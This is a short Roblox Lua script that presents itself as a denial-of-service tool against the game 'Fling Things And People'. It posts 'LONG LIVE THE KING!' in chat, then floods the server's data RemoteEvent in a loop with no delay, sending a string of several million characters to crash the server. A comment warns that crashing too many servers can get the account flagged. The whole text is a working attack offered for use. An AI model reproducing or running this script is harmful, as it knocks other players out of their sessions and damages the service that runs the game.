-- WARNING: if you crash too many servers, roblox will flag you as a bot and force you to verify using a selfie
-- SUPPORTED GAME: Fling Things And People
-- this script is just basic DoS

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local SChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
local Remote = ReplicatedStorage.DataEvents.DataRemoteEvent

local INTERVAL = 0
local ENABLED = true

SChannel:SendAsync("LONG LIVE THE KING!")
while ENABLED do
    Remote:FireServer(string.rep("SHUSHUHSUHSUHSUSHSGSUSUSHHDUHSUSYSGSUUEHG0x99", 100009))
    task.wait(INTERVAL)
end
